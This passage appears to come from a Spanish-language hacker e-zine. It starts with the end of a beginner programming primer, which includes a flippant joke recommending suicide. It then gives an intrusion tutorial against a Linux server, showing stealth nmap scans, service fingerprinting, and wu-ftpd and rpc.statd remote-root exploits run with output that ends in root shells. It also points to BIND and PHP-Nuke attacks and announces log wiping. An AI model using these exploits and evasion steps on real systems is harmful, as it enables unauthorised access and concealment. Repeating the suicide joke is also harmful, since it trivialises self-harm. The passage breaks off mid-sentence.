tarro. Al escrito desarrollado en  otro lenguaje que no  sea el de  maquina, se
le denomina "FUENTE DE PROGRAMA", ya  que  no  es  el programa en si, sino  una
representacion simbolica de el.


III-. Los lenguajes de Programacion

Existen variados niveles de lenguajes.
1) Lenguaje de Maquina
2) Lenguajes Orientados a la maquina, o lenguajes de Bajo nivel
3) Lenguajes de Alto nivel
4) Lenguajes de MUY alto nivel

Parece realmente comico esta calsificacion, pero  asi es y es  bastante logica. 

1) El Lenguaje de  Maquina, como  ya  dije, es el  lenguaje del tarro, son  las 
instrucciones que  entienden la maquina  y  se  representan con un conjunto  de 
digitos binarios, o hexadecimales .

2) Los lenguajes orientados a  la  maquina, son  una  sola  representacion  mas
natural de las  instrucciones  del  lenguaje Maquina, donde   cada  instruccion 
"maquinal" es representado  por  alguna  palabra  o abreviatura  de un lenguaje
natural (como  el ingles), como  por  ejemplo: ADD, DEL, etc. A  este  conjunto 
pertenecen los famosos ENSAMBLADORES (Assembler, pa los gringos al peo).

3) Los lenguajes de Alto nivel, son  orientados al  programador, es decir se le 
simplifica la pega al humano. En  estos  ya se  simplifican los  procesos, y se 
resumen mediante comandos simples, muchas  instrucciones  del de maquina. Estos 
ya   se  parecen  mas a  un  idioma  natural, haciendo  sentencias  logicamente 
dispuestas  para lograr  un  objetivo. Entre  estos  encontramos Basic, Pascal,
C, Fortran, Cobol, etc. 

4) Los lenguajes de MUY alto nivel, son  los orientados al objeto y al grafico,
es decir ya no solo son sentencias de lenguaje natural, sino  que  graficamente 
se representan  procesos y conjunto  de  instrucciones. Ademas cada  Objeto  es
programado  individualmente, y  estos  interactuan en  la   plataforma  que  se 
utilizan. Entre estos podemos encontrar toda la famila VISUAL (basic,  fox pro,
etc) e  inclusive  el  actualmente  popular  flash  (aunque  realmente  es  una 
aplicacion pero filo).

Cabe destacar que entre mas alto el nivel del lenguaje, mas rapido e  intuitivo
sera el desarollo de la programacion, pero a la vez sera mas limitada y guiada.

* Los Compiladores y Ensambladores

Estos programas son los que convierten  los "CODIGOS DE FUENTE" en lenguaje  de 
maquina, los ensambladores para  los de bajo nivel, los  compiladores  para los 
de alto nivel, y funcionan guardando el lenguaje maquina en un PROGRAMA OBJETO,
ya que es una estructura  completa de instrucciones. Existen otros  que son los
INTERPRETADORES, los  cuales no guardan el programa  como  objeto, sino que  va 
ejecutando instruccion por  instruccion  directamente desde el programa Fuente.

IV-. Conceptos de Programacion

En este punto abordare los conceptos claves y basicos para un programador.

1) Las Variables y Constantes

Estos conceptos  corresponde  escencialmente a la  matematica y no  solo  a  la 
informatica, y muy intuitivamente  todos  entendemos esto  pero  vale  la  pena 
aclarar dudas.

a) Las variables son  valores, que  son  suseptibles a  cambios, es  decir  son
valores que varian y de ahi que nace su nombre. Tambien puede ser  representado
mas intuitivamente como una "casilla" o "caja" la cual contiene algun  Valor el
cual puede ser reemplazado por otro sin ningun problema, y sigue siendo la mima
caja.

Ej: La formula del  Area  de  un  cuadrado: Area = L*L, donde  L  es  el  Lado.
L= corresponde a una variable, ya que el area de un cuadrado  de Lado = 10,  es
distinto al de otro de Lado = 5, por lo tanto es  un valor que varia  segun las 
circunstancias.

b) Las constantes  no  son  mas  que Valores  que NO varian y que no pueden ser 
modificadas.

Ej:
X = X + 5

En este caso X es una variable y el 5 es una Constante, en esta simple operacion
se le dice que reemplace la variable X, por X + 5.

c) Declarar una Variable.

Si dijimos antes que intuitivamente podriamos decir que una variable es como una 
"caja", habria que definir que tipo de contenido puede contener y  cuanto podria 
contener. Habria que decir si va a contener Numeros, Letras o Simbolos, y ademas 
cuantos de aquellos puede contener.

Ejemplos: 

X va a contener 8 Letras 
X va a contener 6 digitos numericos enteros
X va a contener 16 digitos numericos reales
X va a contener 4 caracteres de cualquier tipo

d) El valor inicial

Como una variable es un Valor que varia, una variable no puede  estar  vacia, por 
lo tanto se tiene que establecer un valor inicial que se define antes de trabajar
con ella

2) Lectura y Escritura

Para capturar datos y representarlos hay que tener claros los conceptos de READ 
y WRITE, que son la forma de interactuar al usuario.

El WRITE  es  la forma  representar al usuario o  a un sistema  externo  alguna 
expresion o informacion. 

El READ es  la  forma de  obtener  datos externos al programa tanto del usuario
como de un sistema externo, en una variable.

EJ:
'Nombre' es una variable que contiene 12 letras 

WRITE en pantalla 'ingrese su nombre'
READ desde la pantalla (Nombre)
WRITE en pantalla 'Su nombre es (Nombre)'


En este caso  el  programa  primero Imprime  en  pantalla  la expresion 'ingrese
su nombre', luego esperara a que el usuario  escriba su nombre y  lo guardara en 
la variable, por ultimo escribe la  expresion 'Su nombre es' junto con  el valor
de la variable.

3) El orden de un programa

Ya que las instrucciones de un programa se ejecutan en el orden que se escriben,
para que un programa pueda ser interpretado por el compilador y por  ende por el 
PC, es fundamental que se siga una secuencia, donde  hay cierto  orden segun  el 
lenguaje utilizado y otro orden logico que explicare aqui.

Podriamos extender ciertos MANDAMIENTOS logicos:

1. No utilizaras una variable sin antes de definirla
2. Las instrucciones son encadenadas, una tras otra
3. No olvidaras cerrar un proceso 
4. Las funciones aritmeticas tienen que tener una salida
5. Repito, NO utilizaras una variable sin antes definirla
6. No llamaras a un procedimiento sin posicionarlo antes
7. Si es necesario llamar alguna libreria, hazlo antes de todo
8. No llamaras a un archivo sin antes leerlo
9. Conoceras y seguiras el orden logico del lenguaje en particular
10. Repito y Repito, NUNCA utilizaras una variable din antes definirla

4) Operadores Logicos

Esto es simple logica pero igual le vamos a echar un vistazo:

Cuando uno pondera algo, simpre tienen que  existir 2  elementos  y un critero de
comparacion. En informatica esto se llama CONDICION y se compone de 2 expreciones
aritmeticas y un operador relacional entre ellas.

Ej: a^2 > 2ab.

Ahora el resultado de esta  exprecion  logica (condicion) es  verdadero  o falso,
ninguna  otra. ¿Que  pasa  cuando   nesesitamos hacer   mas de una  comparacion?,
¿ cuando  nesesitamos  que  dos  sentencias  se  complementen, se  censuren o se 
niegen? Es ahi donde utilizamos los operadores logicos.

Los operadores logicos simples son : AND, OR, NOT, XOR y XAND

Si elejimos dos sentencias y hacemos una tabla encontraremos lo siguiente.

- ver esquema

EXPLICACION INDIVIDUAL:
a) AND:

Este  operador  significa "Y", es decir para  que la  sentencia "A1 AND A2"  sea
verdadera, es  necesario que ambas SENTENCIAS SEA VERDADERA.

Ejemplo logico:
"Nesesito Agua Y Comida para seguir mi travesia"

* El individuo nesesita Agua AND Comida <--- esas son las dos sentencias

¿Puede continuar su travesia?
* si no le traen ninguna de las dos cosas no podra seguir su travesia (no)
* si le traen tan solo comida, le faltara agua y por lo tanto no podra continuar
(no)
* si le traen tan solo agua, le faltara comida y por lo tanto no podra continuar
(no)
* si le traen agua y comida entonces va a poder continuar su travesia (si)

b) OR:

Este operador significa "O", es decir para que la sentencia "A1 OR A2" sea 
verdadera, es necesario que AL MENOS UNA DE LAS SENTENCIAS SEA VERDADERA.

Ejemplo logico:
"Nesesito Soga O Liana para seguir mi travesia"

* El individuo nesesita Soga OR Liana <--- esas son las dos sentencias 

¿Puede continuar su travesia?
* si no le traen ninguna de las dos cosas no podra seguir su travesia    (no)
* si le traen tan solo Soga, sera suficiente para continuar su travesia  (si)
* si le traen tan solo Liana, sera suficiente para continuar su travesia (si)
* si le traen soga y liana, podra continuar con su magica travesia       (si)

c) XOR (or Exclusivo)

Este operador significa "UNO U EL OTRO PERO NO AMBOS JUNTOS", es  decir para que
 la sentencia "A1 XOR A2" sea verdadera, es necesario que UNA Y SOLO  UNA DE LAS
 SENTENCIAS SEA VERDADERA.

Ejemplo logico: "Nesesito un Gato o un Perro, pero UNO U  EL OTRO  PERO NO AMBOS 
JUNTOS por que sino se pelean en la travesia"

* El individuo nesesita Perro XOR Gato <--- esas son las dos sentencias

¿Puede continuar su travesia?
* si no le traen ninguna de las dos cosas no podra seguir su travesia       (no)
* si le traen tan solo al Gato, sera suficiente para continuar su travesia  (si)
* si le traen tan solo al Perro, sera suficiente para continuar su travesia (si)
* si le traen el Gato y el Perro, no podra continuar con su magica travesia (no)

d) XAND (and Exclusivo)

Esta si que no se usa... por que es la  negacion del XOR, pero  intelectualmente 
significa esto. "UNO  DE  ELLOS TIENE  QUE  SER  FALSO"... Me da lata  hacer  el
ejemplo, ya  entienden  como funciona... Si  no  es asi, echenle un looking a la 
tabla...

* Hay otros tipos de operadores: relacionales, de asignacion, etc. Pero para mas 
informacion leanse un texto del lenguaje que estan usando.

5) Los procedimientos, funciones y las variables locales

- Los procediemientos son pedazos de programa, que se separan del programa 
principal por 3 principales razones: la primera, la segunda y la tercera.

1) para utilizar variables locales y reducir recursos del sistema
2) para usarlos recurrentemente.
3) para hacer mas estructurado el programa y hacer mas facil la correccion de 
   errores

- Las  variables  locales  son  variables   que  existen tan solo  dentro  de un
procedimiento  por  lo  que  no  se  malutiliza  memoria  en guardar informacion 
inesesaria cuano el procedimiento no esta siendo utilizado.

- Las funciones son operaciones recurrentes  que  se separan  del  programa para
usarlas  recurrentemente  y para  no usar  memoria  extra. La  diferencia de los
procediemientos, es  que  las  funciones  tienen  una  entrada  y  una salida de 
VARIABLES.


Ejemplos: a) Procedimiento: 

---------------
Procedimiento Ejemplo

Escribir en pantalla (relajate)

terminar procedimiento
---------------

b) Variable local:

---------------
Procedimiento Ejemplo

variables
'time' del tipo palabra
terminar variables

hora en "time"
Escribir en pantalla (relajate son recien las "time")

terminar procedimiento
---------------

c) Funcion:

---------------
Funcion hora(gettimeofpc = hora/minuto/segundo)

variables
output del tipo palabra

Output = (hora,:,Minuto,:,segundo)

terminar funcion
---------------

Nota del autor: el siguiente tip, lo hice un dia a las 6 de la ma~ana despues de 
bastante alcohol en la sangre y de diversas sustancias psicotropicas, pero igual
puede serle util a alguien

6)(666) Recomendaciones esotericas.

Relajate, lo peor  que  puedes  hacer  al  programar  es  calentarse. Cuando   no 
encuentres  una  solucion o no  sabes  donde esta el error, anda  a  la cocina  y 
tomate un  baso de coca cola (con malicia si es posible), despues  relajate y lee 
todo el codigo (o  procedimiento)  nuevamente. Si  es  muy  largo haz  ingieneria 
inversa y  no  solo  debuggees sino  que anda  de atra para adelate. Luego si  no 
encuentras la solucion puedes escribir todo de  nuevo, invocar a Dios para que te
ayude. Si no funciona invoca a satanas y por ultimo intenta quemar el disco duro.
Pero nunca te enojes... intenta jugar  a  algo y  darte  una  siesta... Si  estas
presionado por el tiempo y no ves salida alguna... reinicia  tu OS, e intenta ver
el  programa  de un  editor distino. Si  nada de esto  funciona  lo mejor es  que 
intentes otro lenguaje  y si no  por  ultimo  suicidate... siempre es  una  buena
salida. jejeje. No, Bien  en serio   NUNCA pero NUNCA te  calenti  cuando  no  te 
resulta algo... las cosas toman su  tiempo y  dedicacion y bla bla bla bla bla...
AUUUHHHGGG me dio sue~o que mi yo  sobrio continue este texto... ZZZZZzzzzzzZZZz.

Fin de la borrachera

V-. Como empezar... 

Lo mejor para empezar es comenzar con  lenguajes intuitivos. Si  sabes  algo  de 
ingles se te hara mucho mas simple. Te recomiendo que NO  empiezes con basic, ya
que es un gran error dentro del aprendizaje ya que aunque su  nombre no lo dice, 
es un  lenguaje extremadamente  desordenado y por lo tanto te  costara un  mundo
adaptarte  a  lenguajes  estrictamente  formales. Te  recomiendo  que despues de 
saber sobre algoritmos y pseudolenguaje pruebes cualquier version del PASCAL, ya
que es sumamente jerarqueizado y reiterativo, tal vez  sea un poco tedioso  pero 
vale la pena. Luego ANTES de pasar a C o C++ lee  algo de  nodos, ya  que es una
gran herramienta y facilita las cosas. AHORA... SI estas apurado por sacar algun 
probecho economico de esto, prueba cualquier  software de la familia VISUAL y si 
eres comerciante podras hasta pagar tus estudios!!!

VI-. Ya CHAO!!!

Bueno  mandenme  mails   si  alguien  quiere   que  escriba  de   informatica  o
teleinformatica... Algun tema en particular (no HACKING por que a veces meto las 
patas) me seria  de gran  ayuda  si me  recomiendan temas  para  escribir. Adios
malditos computines... Lean endemoniados genios... Y no teman  de su  sabiduria,
USE THE FORCE LUKE...

Pd: el que se eche dicom... es mi idolo...


[=========================([ Electron Security Team ])===========================]




[====([ EleKtr0 ])=========================================================EST-4=]
[====([ Intromision en Linux ])==============================================#07=]
[===========================================================([ elektr0@est.cl ])=]


Intromision en Linux por EleKtr0
================================

-[ Indice de Contenidos ]-

 01 - Introduccion
 02 - Requerimientos
 03 - Primeros Pasos
      3.1 - Obteniendo Informacion
 04 - Metodos de Entrada
      4.1 - Explotando FTP
      4.2 - Explotando SMTP
      4.3 - Explotando NAMED
      4.4 - Explotando HTTPD
      4.5 - Explotando POP3
      4.6 - Explotando RPC
 05 - Casos Extremos
      5.1 - Explotando IMAPD
 06 - Tecnicas Varias
      6.1 - Obteniendo listas de ip´s
      6.2 - Sniffeando el Servidor
      6.3 - Manteniendonos en el sistema
      6.3 - Borradando Nuestras Huellas
 07 - Conclusion



01 - Introduccion
-=-=-=-=-=-=-=-=-=-

 Seguramente habras escuchado o leido de que Linux es mucho mas entretenido  a  la
hora del happy hacking, por la amplia gama de distribuciones, por mantener su code
publicamente, por la cantidad en numeros de Servidores Linux`s que  hay... que  se 
yo... o por alguna otra razon, la verdad  esque  cualquier  OS  es  entretenido de 
hackear (ojo no solo hablo de entrar  al  sistema de forma ilegal o no autorizada,
hablo del hack en todas sus formas) todo  OS  es  digno  de un amplio estudio y de
profunda investigacion, ya sea Unix, Irix, OS/2, Win y por supuesto Linux. 

 Es efectivo que una de las formas mas entretenidas de hack y una de las que mayor
actividad concentra es la de entrar en forma no advertida a  sistemas  ajenos, con
sus ventajas y sus riesgos... ya  sabemos  de  el  da~o a  la  privacidad  que  se
produce en una intromision y este es penado actualmente  por  la  Ley  Informatica
Chilena (Ley Nº 19.223).

 La verdad esque si hablamos de seguridad Linux tiene mucho que decir, es bastante
mas seguro que otras alternativas como OS, ya sea, como  workstation  o  bien como
servidor, la caracteristica de que su codigo sea abierto  le  da  la posibilidad a
miles de hackers y programadores  de  todo  el  mundo  estudiar  profundamente  su 
"esqueleto" en busca de bug`s  y  solucionarlos (explotarlos?) rapidamente... Cabe
tambien mencionar que un buen OS  si  no esta acampa~ado de un buen admin entonces
de nada valdra su "aparente seguridad", me  atrevo  a decir que la seguridad de un
server es directamente proporcional al nivel de  conocimientos que tiene el admin,
independiente del OS del que estemos hablando...

 Este  articulo no es presisamente una introduccion a Linux pero tenia que nombrar
su  seguridad  por  que  "kebrarla" es presisamente lo que haremos... La intrusion 
en  Linux  no  es  una  cosa  de  ni~os, aunque  tampoco  se  requieren  exautivos
conocimientos extratecnicos ni ser un guru  de  la  filosofia  Unix, lo  ideal  es
conocer el sistema lo suficiente, su forma  de  trabajo, sus servicios y demonios,
en fin... saber a quien tenemos en frente.

 En este articulo dare algunas pautas basicas para penetrar una maquina  corriendo
con Linux, al mismo tiempo explicare formas de mantenernos ocultos en  el  sistema
sin que seamos detectados, de esta situacion  sacaremos  provecho  para  conseguir
algo mas de informacion  que  nos  sera  de  utilidad mas adelante, ya  terminando
veremos como no dejar  registros de nuestra entrada y borraremos nuestras huellas!
Manos a la Obra!



2 - Requierimientos
-=-=-=-=-=-=-=-=-=-=-

* Tener instalado obviamente Linux
* Nmap (www.insecure.org/nmap)
* Nessus (www.nessus.org)
* Queso (http://packetstormsecurity.org/UNIX/scanners/queso-980922.tar.gz)
* Exploit`s (incluidos)
* Vull Scan (incluidos)
* Sniffer`s (incluidos)
* Zapper`s (incluidos)

[ Notas: Todos los programas, exploits, sniffer´s, zapper´s, etc, que ]
[ que son usados en este articulo han sido adjuntados a la e-zine.    ]
[ Los comandos en linux seran precedidos por un # simulando una shell ]
[ Las direcciones ip`s seran del tipo 192.168.1.0, para los ejemplos  ]
[ Asumo que el lector sabe algo de linux, conceptos, comandos, etc... ]



03 - Primeros Pasos
-=-=-=-=-=-=-=-=-=-=-

Bien escojamos un host objetivo cualquiera: servidor.cl

No sabemos a estas alturas que OS esta corriendo ni  que  puertos  abiertos tiene,
asique lo ideal  en  esta  etapa  de  recogida  de  informacion  es  un  scan  con
reconocimiento  de  OS, hay  miles  de  tools  que hacen esto como sabemos siempre
destacan algunas: nessus, nmap, queso, etc.

Aunque telnet no es una tool  propiamente  tal  sino  mas  bien  un  cliente  para
conexiones remotas, bien nos puede ser usado pasa saber el OS, ¿ como ?... siempre
cabe la posibilidad de que al telnetear nos aparesca ls OS  y otros  datos como su
version, kernel, etc...



3.1 - Obteniendo Informacion
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

# nslookup servidor.cl
Server:		192.168.1.1
Address:	192.168.1.1#53

Name:	servidor.cl
Address: 192.168.1.100

# telnet servidor.cl
Trying 192.168.1.100...
Connected to servidor.cl (192.168.1.100).
Escape character is '^]'.

Red Hat Linux release 6.2 (Zoot)
Kernel 2.2.14-5.0 on an i686
login:

Ok! ya  tenemos  informacion  basica, OS, Distro, Version, Kernel. No  siempre  el
telnet estara abierto esperando por nuestra sutil conexion, ya sea por que estamos
tras la presencia de un firewall que este filtrando  las  conexiones al telnet del
servidor o  por  que  simplemente  no estan corriendo este service, asique siempre
sera una  buena alternativa usar otros metodos como mencione anteriormente, queso,
nmap, incluso Netcraft.

Una vez determinado el OS pasamos a  scanear  sus puertos para saber que servicios
se   estan   corriendo  en  la  maquina. Para   este   paso   suguiero  usar  nmap 
(www.insecure.org/nmap) que  a  mi  entender es el mejor escaneador de puertos que
hay hasta el momento...

# nmap -sS -sR -P0 -O servidor.cl

Starting nmap V. 2.54BETA22 ( www.insecure.org/nmap/ )
Interesting ports on  (192.168.1.100):
(The 1531 ports scanned but not shown below are in state: closed)
Port       State       Service (RPC)
21/tcp     open        ftp                     
22/tcp     open        ssh                     
23/tcp     open        telnet                  
25/tcp     open        smtp                    
53/tcp     open        domain                  
80/tcp     open        http                    
110/tcp    open        pop-3                   
111/tcp    open        sunrpc (rpcbind V2)
143/tcp    open        imap2

Remote operating system guess: Linux 2.1.122 - 2.2.16
Uptime 2.465 days (since Mon Oct  1 08:34:50 2001)

Nmap run completed -- 1 IP address (1 host up) scanned in 68 seconds


Para aquellos que no estan acostumbrados a usar nmap y no saben por que use esos
argumentos para hacer el scan, man nmap xD

Pero igual les aclaro que son argumentos opcionales, de todas maneras recomendables
ya que son basicamente para hacer un scan "sigiloso", algunos  servidores  detectan
portscans y con estas opciones evitamos ser detectados o al menos lo intentamos....


04 - Metodos de Entrada
-=-=-=-=-=-=-=-=-=-=-=-=-

El resultado del scan anterior es muy comun verlo en servidores linux especialmente
si hablamos de rh.

Lo siguiente sera sacar informacion de cada servicio en particular, la idea es que
con el minimo de datos seamos capaces  de  elavorar  un  ataque, osea  necesitamos
software y version del servicio.

Lo siguiente sera sacarle  a  cada  servicio  disponible el maximo de informacion,
para poder de esta manera  elavorar  un ataque  mas  planificado  al  servidor, lo
haremos en cada servicio e intentaremos explotarlos todos.


4.1 - Explotando FTP
-=-=-=-=-=-=-=-=-=-=-

Veamos la lista, tenemos al puerto 21 correspondiente a FTP

# ncftp servidor.cl
NcFTP 3.0.2 (October 19, 2000) by Mike Gleason (ncftp@ncftp.com).
Connecting to 192.168.1.100...                                                                                                 
servidor.cl FTP server (Version wu-2.6.0(1) Mon Feb 28 10:30:36 EST 2000) ready.
Logging in...                                                                                                                  
Guest login ok, access restrictions apply.
Logged in to servidor.cl.
ncftp / > 


Tenemos  como  daemon  del  FTP al software WU-FTPD, muchos son los problemas de
seguridad que  durante  un  buen tiempo ha venido arrastrado este software. Bien
es anonymous y su version la 2.6.0(1), es hora de explotar!...


# ./wuftpd -h
Usage: ./2600 -t <target> [-l user/pass] [-s systype] [-o offset] [-g] [-h] [-x]
         [-m magic_str] [-r ret_addr] [-P padding] [-p pass_addr] [-M dir]
target    : host with any wuftpd
user      : anonymous user
dir       : if not anonymous user, you need to have writable directory
magic_str : magic string (see exploit description)
-g        : enables magic string digging
-x        : enables test mode
pass_addr : pointer to setproctitle argument
ret_addr  : this is pointer to shellcode
systypes: 
  0 - RedHat 6.2 (?) with wuftpd 2.6.0(1) from rpm
* 1 - RedHat 6.2 (Zoot) with wuftpd 2.6.0(1) from rpm
* 2 - SuSe 6.3 with wuftpd 2.6.0(1) from rpm
* 3 - SuSe 6.4 with wuftpd 2.6.0(1) from rpm
* 4 - RedHat 6.2 (Zoot) with wuftpd 2.6.0(1) from rpm (test)
* 5 - FreeBSD 3.4-STABLE with wuftpd 2.6.0(1) from ports
* 6 - FreeBSD 3.4-STABLE with wuftpd 2.6.0(1) from packages
* 7 - FreeBSD 3.4-RELEASE with wuftpd 2.6.0(1) from ports
* 8 - FreeBSD 4.0-RELEASE with wuftpd 2.6.0(1) from packages
#

# ./wuftpd -t servidor.cl -s 0
Target: 161.132.148.194 (ftp/<shellcode>): RedHat 6.2 (?) with wuftpd 2.6.0(1) from rpm
Return Address: 0x08075844, AddrRetAddr: 0xbfffb028, Shellcode: 152

loggin into system..
USER ftp
331 Guest login ok, send your complete e-mail address as password.
PASS <shellcode>
230-Next time please use your e-mail address as your password
230-        for example: joe@servidor.cl
230 Guest login ok, access restrictions apply.
STEP 2 : Skipping, magic number already exists: [87,01:03,02:01,01:02,04]
STEP 3 : Checking if we can reach our return address by format string
STEP 4 : Ptr address test: 0xbfffb028 (if it is not 0xbfffb028 ^C me now)
STEP 5 : Sending code.. this will take about 10 seconds.
Press ^\ to leave shell
Linux webconection 2.2.14-12 #1 Tue Apr 25 13:04:07 EDT 2000 i686 unknown
uid=0(root) gid=0(root) egid=50(ftp) groups=50(ftp)


4.2 - Explotando SMTP
-=-=-=-=-=-=-=-=-=-=-

Sigamos nuestra lista de puertos, cada uno una posible entrada, tenemos a SMTP(25)
el servidor de correo. Para explotar este  servicio  debemos  buscar  exploits  de 
acuerdo al nombre y version del daemon, normalmente sendmail. No creo que requiera
mayores explicaciones. Para obtener la version y nombre nos conectamos.

# telnet servidor.cl 25
Trying 192.168.1.100...
Connected to servidor.cl.
Escape character is '^]'.
220 servidor.cl ESMTP Sendmail 8.11.2/8.8.7; Mon, 22 Oct 2001 19:28:21 -0300



4.3 - Explotando NAMED
-=-=-=-=-=-=-=-=-=-=-=-


Sigue  el  turno  del  servidor  de  nombres (DNS, Named), para un webhosting su
servicio mas importante, para nosotros el servicio mas codiciado a explotar, por
que? shuu mas atentos. Obtengamos un  poco de informacion para iniciar un ataque
contra el DNS de servidor.cl

Necesitamos la(s) direccion(es) del servidor de nombres:

# host -t ns servidor.cl
servidor.cl. name server ns1.servidor.cl.
servidor.cl. name server ns2.servidor.cl.

Ahora necesitamos la version:
# dig @ns1.servidor.cl version.bind chaos txt

; <<>> DiG 9.1.0 <<>> @servidor.cl version.bind chaos txt
;; global options:  printcmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 21340
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;version.bind.			CH	TXT

;; ANSWER SECTION:
VERSION.BIND.		0	CH	TXT	"8.2.2-P5"

;; Query time: 40 msec
;; SERVER: 164.77.200.218#53(servidor.cl)
;; WHEN: Mon Oct 22 19:40:01 2001
;; MSG SIZE  rcvd: 63

Correcto, seria 8.2.2-P5
Compilamos y corremos nuestro exploit favorito para esta version de bind.

# ./tsig 
[*] named 8.2.x (< 8.2.3-REL) remote root exploit by lucysoft, Ix
[*] fixed by ian@cypherpunks.ca and jwilkins@bitland.net

[*] usage : ./tsig host



Muchos de estos exploit  para  el named provocan buffer`s demasiado grandes que
terminan en la mayoria  de los  casos votando  al  servidor  DNS, tambien  cabe
se~alar que nuestros  privilegios  al  rootear  no  seran los del root, asi que
disponemos de un lapso de tiempo bastante reducido para obtener root localmente
antes de que se den  cuenta que el dns no esta trabajando correctamente, lo que
despertaria mas de una sospecha de intromision.
Otro punto  importante es que no basta con reiniciar el named para levantar  el
servicio solo queda reiniciar la maquina, cuidado!...



4.4 - Explotando HTTPD
-=-=-=-=-=-=-=-=-=-=-=-

Es el turno del  port  80  correspondiente  al  servicio  httpd, en muchos Linux
controlado por Apache. Necesitamos informacion en este caso recomiendo Netcraft,
nos dira si es o no Apache u otro software, nos mostrara los modulos con los que
esta trabajando, la version, etc...

Con esta info buscamos algun exploit de los tantos que hay para httpd de acuerdo
a la version y software, compilamos y lo corremos.

Ahora no se limiten solo a explotar directamente Apache, ya que  el port  80  es
explotable tambien de otras formas, por ejemplo tenemos el  directorio  cgi-bin,
muchos scripts escritos en perl u otro lenguaje tiene graves problemas que dejan
al descubierto al servidor. Para  los  mas  flojos  existen  escanners de cgi`s, 
recomiendo  para  estos  casos  nessus (www.nessus.org)  que  para cgi`s existen 
plugins (http://cgi.nessus.org/plugins/dump.php3?family=CGI%20abuses).

El puerto 80 tambien compromete a estos nuevos sistemas de portales como PHPNUKE,
POST-NUKE, etc ya que se le pueden  pasar  parametros  a  la  url  alterandola de
manera que forzandola nos entregue la informacion que andamos buscando, ejemplos?
tenemos el caso de uno de los ultimos, bug`s descubiertos en php-nuke: 
http://www.hackit.cl/html/images/hacked.txt

Ese es el archivo config.php, nos muestra user y  passwd... ahora  bastaria  con
conectarnos al mysql identificarnos  con  esa  cuenta y a cambiar variables. Les
recomiendo que profundicen en este servicio.


4.5 - Explotando POP3
-=-=-=-=-=-=-=-=-=-=-

Continuamos con nuestra lista de servicios, es el turno  de  pop-3 (Post  Office
Protocol version 3) usado para leer el  correo  remotamente. El procedimiento no
cambia en absoluto, sacamos el maximo  de  informacion del servicio corriendo en
servidor.cl, vemos su version, buscamos bug´s  que  hayan  sido descubierto para
esa version, buscamos la forma de explotar  y  lo  hacemos!. Creo  que  es  algo
demasiado obvio como para estar dando  ejemplo, ademas algo tienen que hacer...


4.6 - Explotando RPC
-=-=-=-=-=-=-=-=-=-=-

A quien le  toca? quien dijo RPC? Los  servicios  RPC (Remote Procedure Call)
para quienes no lo saben estos  servicios  son un conjunto  de funciones  que
permiten a un aplicacion cominicarse con otra maquina (cliente-servidor).

En Linux suele estar instalado NFS que lanza  el daemon RPC  portmap  tambien
conocido como rpcbind. Los mas usuales son: mountd, nfs, status, amd, autofsd.

Informacion? la necesitas? entonces bamos por ella:

# rpcinfo -p servidor.cl
   programa vers proto   puerto
    100000    2   tcp    111  portmapper
    100000    2   udp    111  portmapper
    100021    1   udp   1024  nlockmgr
    100021    3   udp   1024  nlockmgr
    100021    1   tcp   1024  nlockmgr
    100021    3   tcp   1024  nlockmgr
    100024    1   udp    617  status
    100024    1   tcp    619  status

Para  aquellos  fanaticos  de  las  tools, tienen  a  nmap que tambien hace un
reconocimiento de servicios  RPC  en  el  host  escaneado  con  la  opcion -R.

El servicio  portmapper  como les conte anteriormente es uno de los mas usados, 
y por esa misma razon uno de  los mas explotados, no quiere decir que los demas
sean seguros, o que no se  puedan  explotar, es solo que a portmapper se le han
descubierto mas  vulnerabilidades y formas de explotarlas. Veamos como explotar
entonces:

# ./statdx
-h
statdx2 by ron1n <shellcode@hotmail.com>
Usage: ./statdx [options] target
Available options:
->	<argument required> [default behavior]
-t	attack the server using tcp [udp]
-p	<port statd listens on> [query]
-a	<stack address of the buffer>
-l	<length of the buffer> [1024]
-o	<offset from buffer> [600]
-w	<number of words to wipe> [9]
-s	<timeout in seconds> [5]
-n	<brute force mode count> [1]
-f	attack saved ebp [saved eip]
-c	<"command to execute"> [portbind]
-d	use a hardcoded <type>
Available types:
0	Redhat Linux 6.2/6.1/6.0


# ./statdx -t servidor.cl -d 0
wiping:  9
buffer:  0xbffff314/1024/999
target:  0xbffff718 --> 0xbffff56c/buffer[600]
method:  return address
command: <portbind>
--
clnt_call(): RPC: Timed out
A timeout was expected. Exploitation succeeded?
Owned?!
total 115
drwxr-xr-x  20 root     root         1024 Sep 19 22:42 ./
drwxr-xr-x  20 root     root         1024 Sep 19 22:42 ../
drwxr-xr-x   2 root     root         1024 Feb 17  2000 .automount/
drwxr-xr-x   2 root     root         2048 Sep 20 09:36 bin/
-rwxr-xr-x   1 root     root        31336 Sep 18 03:27 bins*
drwxr-xr-x   3 root     root         1024 Sep 18 02:31 boot/
drwxr-xr-x   7 root     root        35840 Sep 18 02:32 dev/
drwxr-xr-x  44 root     root         4096 Sep 20 14:53 etc/
drwxr-xr-x  11 root     root         4096 Sep 19 22:48 home/
-rw-r--r--   1 root     root            6 Sep 19 22:42 home.lock
drwxr-xr-x   4 root     root         3072 Sep 17 03:13 lib/
drwxr-xr-x   2 root     root        12288 Sep 17 02:52 lost+found/
drwxr-xr-x   2 root     root            0 Sep 18 02:31 misc/
drwxr-xr-x   4 root     root         1024 Sep 17 02:55 mnt/
drwxr-xr-x   2 root     root         1024 Aug 23  1999 opt/
dr-xr-xr-x  62 root     root            0 Sep 17 22:31 proc/
drwxr-x---  13 root     root         1024 Sep 18 22:53 root/
drwxr-xr-x   3 root     root         3072 Sep 18 03:22 sbin/
drwxr-xr-x   3 root     root         1024 Sep 17 03:14 tftpboot/
drwxrwxrwt  11 root     root         2048 Sep 20 15:14 tmp/
drwxr-xr-x  23 root     root         4096 Sep 17 03:09 usr/
drwxr-xr-x  24 root     root         4096 Sep 17 21:57 var/
 11:34am  up 2 days, 13:02,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU  WHAT
Linux servidor 2.2.14-12 #1 Tue Nov 25 13:04:07 EDT 2000 i686 unknown
uid=0(root) gid=0(root)


Este servicio solo puede ser explotado una sola ves, quiere decir que si queremos
volver a explotar por rpcbind la maquina debe ser reboteada. Si  logramos  entrar
lo hacemos directamente como root.



05 - Casos Extremos
-=-=-=-=-=-=-=-=-=-

Muchas veces tenemos un login y passwd de algun servidor por hai, pero te encuentras
con que no tiene telnet o  ssh, o  algun  medio  para logearte reomtamente, en otros
